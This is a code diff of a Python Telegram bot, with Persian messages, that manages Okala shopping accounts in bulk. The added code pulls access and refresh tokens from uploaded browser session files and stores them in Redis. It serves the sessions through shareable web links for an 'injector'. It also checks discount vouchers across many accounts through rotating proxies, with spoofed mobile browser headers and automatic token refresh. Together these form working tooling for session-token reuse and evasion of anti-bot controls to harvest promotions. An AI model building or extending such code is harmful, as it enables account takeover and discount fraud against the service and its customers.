@@ -71,7 +71,7 @@ def get_user_id_from_token(token):
         payload += '=' * (-len(payload) % 4)
         decoded_bytes = base64.urlsafe_b64decode(payload)
         data = json.loads(decoded_bytes)
-        uid = data.get('userId') or data.get('alternativeCustomerId')
+        uid = data.get('cerberusId') or data.get('alternativeCustomerId') or data.get('userId')
         return int(uid) if uid else 0
     except Exception:
         return 0
@@ -93,7 +93,10 @@ class OkalaAPI:
             'source': 'okala',
             'ui-version': '2.0',
             'origin': 'https://www.okala.com',
-            'User-Agent': random.choice(USER_AGENTS)
+            'User-Agent': random.choice(USER_AGENTS),
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
         }
 
     def log_request(self, method, url, status_code, response_text):
@@ -136,80 +139,188 @@ class OkalaAPI:
         return None, None
 
 # ==========================================
-# پردازش تخفیف‌ها از دیتابیس (بدون ساخت لینک جدید)
+# پردازش تخفیف‌ها از دیتابیس
 # ==========================================
 async def process_discounts_and_send_report(bot, chat_id, acc_keys):
-    report_text = "🎁 <b>گزارش کدهای تخفیف (دیتابیس):</b>\n\n"
-    found_any = False
     loop = asyncio.get_running_loop()
     api = OkalaAPI()
-    
-    # استخراج لینک‌های قدیمی کاربر از لاگ‌های دیتابیس
+    ts = int(time.time())
+
+    # بررسی وجود پروکسی
+    proxy_check = await get_random_proxy_from_db()
+    if not proxy_check:
+        await bot.send_message(
+            chat_id=chat_id,
+            text="⚠️ <b>هیچ پروکسی‌ای در سیستم تنظیم نشده است!</b>\n"
+                 "بررسی تخفیف بدون پروکسی ادامه می‌یابد — ممکن است نتایج نادرست باشد.\n"
+                 "برای تنظیم پروکسی از پنل ادمین اقدام کنید.",
+            parse_mode='HTML'
+        )
+
+    # استخراج لینک‌های ثبت‌شده از لاگ دیتابیس
     raw_logs = await redis_client.lrange("global_link_logs", 0, -1)
     phone_to_latest_link = {}
     for item in raw_logs:
         try:
             entry = json.loads(item)
             phone_to_latest_link[entry['phone']] = entry['link']
-        except: pass
-        
-    def _check_sync(acc_token, ref_token, uid, p_dict):
+        except:
+            pass
+
+    total = len(acc_keys)
+    progress_msg = await bot.send_message(
+        chat_id=chat_id,
+        text=f"🔍 شروع بررسی <b>{total}</b> اکانت با پروکسی...\n⏳ لطفاً منتظر بمانید.",
+        parse_mode='HTML'
+    )
+
+    # لاگ تفصیلی هر بررسی
+    detail_logs = []
+
+    def _check_sync(acc_token, ref_token, uid, p_dict, phone):
+        proxy_ip = p_dict['http'].split('@')[-1].split(':')[0] if p_dict else "بدون پروکسی"
+        log_line = f"[{time.strftime('%H:%M:%S')}] 📱 {phone} | UUID: {uid} | پروکسی: {proxy_ip}\n"
+
         status, res = api.check_discount_api(acc_token, uid, proxy_dict=p_dict)
+        refreshed = False
+
         if status == 401 and ref_token:
+            log_line += f"  ♻️ توکن منقضی — در حال رفرش...\n"
             new_acc, new_ref = api.refresh_token(ref_token, proxy_dict=p_dict)
             if new_acc:
                 status, res = api.check_discount_api(new_acc, uid, proxy_dict=p_dict)
-                return status, res, new_acc, new_ref
-        return status, res, None, None
-    
+                refreshed = True
+                log_line += f"  ✅ رفرش موفق — بررسی مجدد انجام شد.\n"
+                return status, res, new_acc, new_ref, log_line
+            else:
+                log_line += f"  ❌ رفرش ناموفق.\n"
+        
+        if status == 200 and isinstance(res, dict):
+            vouchers = res.get('data', [])
+            amounts = [v.get('discountAmount', 0) for v in vouchers if v.get('discountAmount')]
+            if vouchers:
+                log_line += f"  🎁 تخفیف یافت شد: {len(vouchers)} کد | بیشترین مبلغ: {max(amounts)//10000 if amounts else '?'} هزار تومان\n"
+            else:
+                log_line += f"  ➖ بدون تخفیف (پاسخ 200)\n"
+        elif status == 401:
+            log_line += f"  🔒 توکن کاملاً منقضی شده.\n"
+        else:
+            log_line += f"  ❌ خطا — کد پاسخ: {status}\n"
+
+        return status, res, None, None, log_line
+
+    # پردازش اکانت‌ها
+    discount_results = []
+    done = 0
+
     for key in acc_keys:
         try:
             phone = key.replace("account:", "")
             token_data = await redis_client.hgetall(key)
             access_token = token_data.get("access_token")
             refresh_token = token_data.get("refresh_token")
-            if not access_token: continue
-            
+
+            if not access_token:
+                detail_logs.append(f"[{time.strftime('%H:%M:%S')}] ⚠️ {phone} — توکن موجود نیست، رد شد.\n")
+                done += 1
+                continue
+
             user_uuid = get_user_id_from_token(access_token)
-            if not user_uuid: continue
-            
+            if not user_uuid:
+                detail_logs.append(f"[{time.strftime('%H:%M:%S')}] ⚠️ {phone} — UUID قابل استخراج نیست، رد شد.\n")
+                done += 1
+                continue
+
             proxy_dict = await get_random_proxy_from_db()
-            status, res, new_acc, new_ref = await loop.run_in_executor(
-                executor, _check_sync, access_token, refresh_token, user_uuid, proxy_dict
+
+            status, res, new_acc, new_ref, log_line = await loop.run_in_executor(
+                executor, _check_sync, access_token, refresh_token, user_uuid, proxy_dict, phone
             )
-            
+            detail_logs.append(log_line)
+
             if new_acc:
                 await redis_client.hset(key, mapping={"access_token": new_acc, "refresh_token": new_ref or ""})
 
-            # ایمن‌سازی بررسی خروجی سرور
             if status == 200 and isinstance(res, dict):
                 vouchers = res.get('data', [])
                 if vouchers:
-                    found_any = True
-                    old_link = phone_to_latest_link.get(phone, "لینک قدیمی در دیتابیس یافت نشد")
-                    report_text += f"📱 شماره {phone}: دارای <b>{len(vouchers)}</b> تخفیف\n🔗 {old_link}\n\n"
-                
+                    amounts = [v.get('discountAmount', 0) for v in vouchers if v.get('discountAmount')]
+                    max_amount = max(amounts) // 10000 if amounts else 0
+                    old_link = phone_to_latest_link.get(phone, "")
+                    discount_results.append({
+                        "phone": phone,
+                        "count": len(vouchers),
+                        "max_amount": max_amount,
+                        "link": old_link
+                    })
+
+            done += 1
+            # آپدیت پیشرفت هر ۵ اکانت یا آخرین اکانت
+            if done % 5 == 0 or done == total:
+                try:
+                    await progress_msg.edit_text(
+                        f"🔍 بررسی اکانت‌ها...\n"
+                        f"✅ انجام شده: <b>{done}/{total}</b>\n"
+                        f"🎁 دارای تخفیف تاکنون: <b>{len(discount_results)}</b>",
+                        parse_mode='HTML'
+                    )
+                except Exception:
+                    pass
+
         except Exception as e:
+            detail_logs.append(f"[{time.strftime('%H:%M:%S')}] ❌ خطای کلی برای {key}: {e}\n")
             logging.error(f"Discount check error for {key}: {e}")
-            
-    if not found_any: report_text += "هیچ تخفیفی یافت نشد."
-    
-    debug_logs = api.request_logs
-    
+
+    # ساخت گزارش نهایی
+    if discount_results:
+        report_text = f"🎁 <b>گزارش بررسی تخفیف‌ها ({len(discount_results)} اکانت دارای تخفیف از {total}):</b>\n\n"
+        for r in discount_results:
+            link_line = f"🔗 {r['link']}" if r['link'] else "⚠️ لینک ثبت‌شده‌ای در دیتابیس یافت نشد"
+            report_text += (
+                f"📱 شماره: <code>{r['phone']}</code>\n"
+                f"🎟 تعداد کد تخفیف: <b>{r['count']}</b> | بیشترین مبلغ: <b>{r['max_amount']} هزار تومان</b>\n"
+                f"{link_line}\n"
+                f"{'─'*30}\n"
+            )
+    else:
+        report_text = f"➖ <b>هیچ تخفیفی یافت نشد.</b>\nتعداد کل اکانت‌های بررسی‌شده: {total}"
+
+    # ارسال گزارش تخفیف‌ها
+    try:
+        await progress_msg.delete()
+    except Exception:
+        pass
+
     try:
         if len(report_text) > 4000:
             file_out = io.BytesIO(report_text.encode('utf-8'))
-            await bot.send_document(chat_id=chat_id, document=file_out, filename=f"Discounts_Report_{int(time.time())}.txt", caption="✅ گزارش کامل تخفیف‌ها")
+            await bot.send_document(
+                chat_id=chat_id, document=file_out,
+                filename=f"Discounts_Report_{ts}.txt",
+                caption=f"✅ گزارش کامل تخفیف‌ها — {len(discount_results)} اکانت دارای تخفیف"
+            )
         else:
             await bot.send_message(chat_id=chat_id, text=report_text, parse_mode='HTML', disable_web_page_preview=True)
-            
-        if debug_logs:
-            debug_out = io.BytesIO("".join(debug_logs).encode('utf-8'))
-            await bot.send_document(chat_id=chat_id, document=debug_out, filename=f"Discount_Debug_Log_{int(time.time())}.txt", caption="📄 فایل لاگ پاسخ درخواست‌های سرور")
-            
     except Exception as e:
-        logging.error(f"Error sending report doc: {e}")
-        await bot.send_message(chat_id=chat_id, text="❌ خطا در ارسال فایل گزارش.")
+        logging.error(f"Error sending discount report: {e}")
+
+    # ارسال لاگ تفصیلی
+    try:
+        full_log = f"=== لاگ بررسی تخفیف | {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n"
+        full_log += f"کل اکانت‌ها: {total} | دارای تخفیف: {len(discount_results)}\n"
+        full_log += "=" * 50 + "\n\n"
+        full_log += "".join(detail_logs)
+        full_log += "\n\n=== لاگ درخواست‌های HTTP ===\n"
+        full_log += "".join(api.request_logs)
+
+        log_out = io.BytesIO(full_log.encode('utf-8'))
+        await bot.send_document(
+            chat_id=chat_id, document=log_out,
+            filename=f"Discount_Full_Log_{ts}.txt",
+            caption=f"📄 لاگ کامل بررسی ({total} اکانت)"
+        )
+    except Exception as e:
+        logging.error(f"Error sending log file: {e}")
 
 # ==========================================
 # تبدیل دیتا برای وب
@@ -296,8 +407,39 @@ async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         if action == 'zip_to_link':
-            # ساخت لینک از زیپ غیرفعال شده - فضای دیتابیس پر شده
-            await msg.edit_text("⚠️ <b>خطا: فضای دیتابیس پر شده است.</b>\n\nامکان ساخت لینک جدید وجود ندارد.", parse_mode='HTML')
+            links_text = "<b>لیست لینک‌های تولید شده:</b>\n\n"
+            count = 0
+            for file_path in json_files_paths:
+                filename = os.path.basename(file_path)
+                try:
+                    with open(file_path, 'r', encoding='utf-8') as f:
+                        file_content = f.read()
+                        data = json.loads(file_content)
+                        access_token, refresh_token = None, None
+                        for cookie in data.get('cookies', []):
+                            if cookie.get('name') == 'tokenMS': access_token = cookie.get('value')
+                            elif cookie.get('name') == 'refresh_token': refresh_token = cookie.get('value')
+                        if not access_token:
+                            for origin in data.get('origins', []):
+                                for item in origin.get('localStorage', []):
+                                    if item.get('name') == 'tokenMS': access_token = item.get('value')
+                                    elif item.get('name') == 'refresh_token': refresh_token = item.get('value')
+                        phone = filename.replace('.json', '')
+                        if access_token and not await redis_client.exists(f"account:{phone}"):
+                            await redis_client.hset(f"account:{phone}", mapping={"access_token": access_token, "refresh_token": refresh_token or ""})
+                        link_id = str(uuid.uuid4())[:12]
+                        await redis_client.setex(f"acc_link:{link_id}", expire_time, file_content)
+                        final_url = f"{WEB_DOMAIN}/acc/{link_id}"
+                        links_text += f"📱 <b>شماره {phone}:</b>\n{final_url}\n\n"
+                        count += 1
+                except Exception:
+                    pass
+            if len(links_text) > 4000:
+                file_out = io.BytesIO(links_text.encode('utf-8'))
+                await context.bot.send_document(chat_id=user_id, document=file_out, filename=f"Links_{int(time.time())}.txt", caption=f"✅ استخراج {count} اکانت انجام شد.")
+                await msg.delete()
+            else:
+                await msg.edit_text(f"✅ <b>تعداد {count} اکانت ذخیره شد:</b>\n\n{links_text}", disable_web_page_preview=True, parse_mode='HTML')
 
         elif action == 'zip_discount_check':
             await msg.edit_text("🔍 در حال بررسی وضعیت تخفیف‌ها با سیستم ضدربات و رفرش‌توکن. لطفاً منتظر بمانید...")
@@ -1067,18 +1209,47 @@ async def save_name_and_continue(update: Update, context: ContextTypes.DEFAULT_T
     return await generate_and_send_link(update, context, msg)
 
 async def generate_and_send_link(update: Update, context: ContextTypes.DEFAULT_TYPE, status_msg) -> int:
-    # ساخت لینک غیرفعال شده - فضای دیتابیس پر شده
+    auth_data = context.user_data.get('auth_data')
+    phone = context.user_data.get('phone', 'نامشخص')
+    injection_json = format_for_injector(auth_data)
+    link_id = str(uuid.uuid4())[:12]
+    
+    expire_time = await redis_client.get("settings:expire_time")
+    expire_time = int(expire_time) if expire_time else 7200
+    await redis_client.setex(f"acc_link:{link_id}", expire_time, json.dumps(injection_json, ensure_ascii=False))
+    
+    final_url = f"{WEB_DOMAIN}/acc/{link_id}"
+    
+    if 'session_links' not in context.user_data:
+        context.user_data['session_links'] = []
+    context.user_data['session_links'].append({"phone": phone, "link": final_url})
+    
+    tg_user = update.effective_user
+    log_entry = {
+        "tg_id": tg_user.id,
+        "tg_name": tg_user.full_name or "نامشخص",
+        "tg_user": tg_user.username or "",
+        "phone": phone,
+        "link": final_url,
+        "created_at": time.strftime("%Y-%m-%d %H:%M:%S")
+    }
+    await redis_client.rpush("global_link_logs", json.dumps(log_entry, ensure_ascii=False))
+    
+    count = len(context.user_data['session_links'])
+    
     kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("📞 تماس با مدیر", callback_data="contact_admin")],
+        [InlineKeyboardButton("➕ ساخت لینک برای یک خط دیگر", callback_data="user_login")],
+        [InlineKeyboardButton("🏁 پایان لینک ساختن", callback_data="finish_link_creation")],
         [InlineKeyboardButton("🔙 بازگشت به منوی اصلی", callback_data="main_menu")]
     ])
-    await status_msg.edit_text(
-        "⚠️ <b>خطا: فضای دیتابیس پر شده است.</b>\n\n"
-        "متأسفانه در حال حاضر امکان ساخت لینک جدید وجود ندارد.\n"
-        "برای اطلاعات بیشتر و رفع مشکل با مدیریت تماس بگیرید.",
-        reply_markup=kb,
-        parse_mode='HTML'
+    
+    text = (
+        f"✅ <b>ورود به حساب شماره {phone} با موفقیت انجام شد.</b>\n\n"
+        f"📥 لینک تولید شد و آماده تحویل است.\n"
+        f"📊 تعداد لینک‌های آماده ارسال در این نوبت: <b>{count}</b>\n\n"
+        "می‌توانید شماره دیگری اضافه کنید یا دکمه <b>«🏁 پایان لینک ساختن»</b> را بزنید."
     )
+    await status_msg.edit_text(text, reply_markup=kb, parse_mode='HTML')
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
